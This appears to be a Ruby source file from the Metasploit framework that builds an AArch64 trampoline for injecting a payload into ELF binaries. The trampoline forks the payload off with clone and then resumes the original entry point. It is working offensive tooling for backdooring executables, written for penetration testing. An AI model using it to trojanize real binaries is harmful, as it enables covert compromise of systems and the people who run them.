# frozen_string_literal: true

require 'msf/core/assembly/a_arch64'

module Msf
  module Exe
    class ElfInjector
      # Builds an AArch64 trampoline that clones before running the payload.
      #
      # Metasm 1.0.6 cannot parse all instructions used here as AArch64 assembly text. The shared
      # encoder therefore selects opcodes and populates internal fields that may change in future
      # Metasm releases.
      class AArch64
        # @param entrypoint [Integer] Original ELF entry point.
        # @param injected_address [Integer] Virtual address of the injected segment.
        def initialize(entrypoint:, injected_address:)
          @entrypoint = entrypoint
          @injected_address = injected_address
        end

        # @return [String] Encoded AArch64 trampoline.
        def generate
          save = save_registers
          restore = restore_registers
          clone = [
            Msf::Assembly::AArch64.instruction('mov', rt: 0, i16_5: 17), # mov x0, #0x11 (SIGCHLD)
            Msf::Assembly::AArch64.instruction('mov', rt: 1, i16_5: 0),  # mov x1, #0 (child_stack)
            Msf::Assembly::AArch64.instruction('mov', rt: 2, i16_5: 0),  # mov x2, #0 (parent_tid)
            Msf::Assembly::AArch64.instruction('mov', rt: 3, i16_5: 0),  # mov x3, #0 (child_tid)
            Msf::Assembly::AArch64.instruction('mov', rt: 4, i16_5: 0),  # mov x4, #0 (tls)
            Msf::Assembly::AArch64.instruction('mov', rt: 8, i16_5: 220), # mov x8, #220 (clone)
            Msf::Assembly::AArch64.instruction('svc', i16_5: 0) # svc #0
          ]

          prefix_size = save.bytesize + clone.sum(&:bytesize) + 4
          parent_branch_address = @injected_address + prefix_size + restore.bytesize
          # restore; b entrypoint
          parent = restore + Msf::Assembly::AArch64.branch('b', instruction_address: parent_branch_address, destination: @entrypoint, bits: 26, field: :i26_0)
          child_address = @injected_address + prefix_size + parent.bytesize
          clone_branch_address = @injected_address + save.bytesize + clone.sum(&:bytesize)
          # cbz x0, child
          clone << Msf::Assembly::AArch64.branch('cbz', instruction_address: clone_branch_address, destination: child_address, rt: 0)

          save + clone.join + parent + restore
        end

        private

        def save_registers
          # sub sp, sp, #0x100
          instructions = [Msf::Assembly::AArch64.instruction('sub', rt: 31, rn: 31, i12_10_s1: 256)]
          (0..28).step(2) do |register|
            # stp xN, xN+1, [sp, #offset]
            instructions << stack_pair('stp', register, register + 1, register * 8)
          end
          # stp x30, xzr, [sp, #0xf0]
          instructions << stack_pair('stp', 30, 31, 240)
          instructions.join
        end

        def restore_registers
          instructions = []
          (0..28).step(2) do |register|
            # ldp xN, xN+1, [sp, #offset]
            instructions << stack_pair('ldp', register, register + 1, register * 8)
          end
          # ldp x30, xzr, [sp, #0xf0]
          instructions << stack_pair('ldp', 30, 31, 240)
          # add sp, sp, #0x100
          instructions << Msf::Assembly::AArch64.instruction('add', rt: 31, rn: 31, i12_10_s1: 256)
          instructions.join
        end

        def stack_pair(name, first_register, second_register, offset)
          Msf::Assembly::AArch64.instruction(name, rt: first_register, rt2: second_register, m_rn_s7: ((offset / 8) << 10) | 31)
        end
      end
    end
  end
end
